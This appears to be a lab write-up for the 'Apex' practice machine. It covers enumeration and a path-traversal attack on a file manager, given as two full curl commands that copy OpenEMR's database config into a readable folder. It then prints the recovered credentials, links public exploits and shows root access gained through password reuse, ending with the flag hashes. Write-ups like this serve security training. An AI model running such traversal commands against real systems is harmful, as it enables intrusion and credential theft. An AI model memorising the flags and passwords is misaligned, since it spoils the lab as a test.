# APEX \| 20 POINTS

![](../.gitbook/assets/3748b708433445f2a29f0e6ac3c9c377.png)

## NMAP SCAN

```text
PORT     STATE SERVICE     REASON         VERSION
80/tcp   open  http?       syn-ack ttl 63
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       syn-ack ttl 63 MySQL (blocked - too many connection errors)
```

## SAMBA ENUMERATION

Two files and we only have Read access.

![](../.gitbook/assets/6e36353d07ab44d090943ee3853672b0.png)

## FeroxBuster 

### /filemanager

![](../.gitbook/assets/04d5a02812574d70a8373a2a85b9dba5.png)

The Sames files found in SMB Share

![](../.gitbook/assets/c29ca3721c3748a38629a2781922e38d.png)

![](../.gitbook/assets/5799af14cf8b478f9fe5e233d8972c8f.png)

### EXPLOIT \(LFI\)

* [https://www.exploit-db.com/exploits/45987](https://www.exploit-db.com/exploits/45987)

![](../.gitbook/assets/9a5ef58f110b44ea822307a63555f588.png)

### /OPENEMR

![](../.gitbook/assets/2e70b9881404463fbb3c55619beeadca.png)

![](../.gitbook/assets/b4f332360f1647f7aa4d58a5a57aca66.png)

To find how the files are stored in the web root, see the github page of the application

* [https://github.com/openemr/openemr](https://github.com/openemr/openemr)

The database creds are stored in /site/default/sql.conf.php

```text
curl -X POST -d "sub_action=copy&path=../../../../../../../var/www/openemr/sites/default/sqlconf.php" -H "Cookie: PHPSESSID=cq0h5q153nhptfk0kcp1nld88h" "http://192.168.159.145/filemanager/ajax_calls.php?action=copy_cut"

curl -X POST -d "path=Documents/" -H "Cookie: PHPSESSID=cq0h5q153nhptfk0kcp1nld88h" "http://192.168.159.145/filemanager/execute.php?action=paste_clipboard"

```

![](../.gitbook/assets/2260e17d2e0642689d30cc4f7a501c7f.png)

```text
openemr:C78maEQUIEuQ

```

![](../.gitbook/assets/7d3500cd67e74ffeb17efb1acccac66a.png)

![](../.gitbook/assets/86572206092442149603376967c995d4.png)

```text
admin:thedoctor
```

### EXPLOIT

* [https://www.exploit-db.com/exploits/45161](https://www.exploit-db.com/exploits/45161)

![](../.gitbook/assets/1b7754875f02488285713777078503ce.png)

## PRIVESC

* The password "thedoctor" is also the root password.

## FLAGS

### LOCAL.TXT

```text
31e3542adacf3a0e94478718821e1983
```

### PROOF.TXT

```text
2d45958a2dfeeb9b7f84568cc86d650d
```

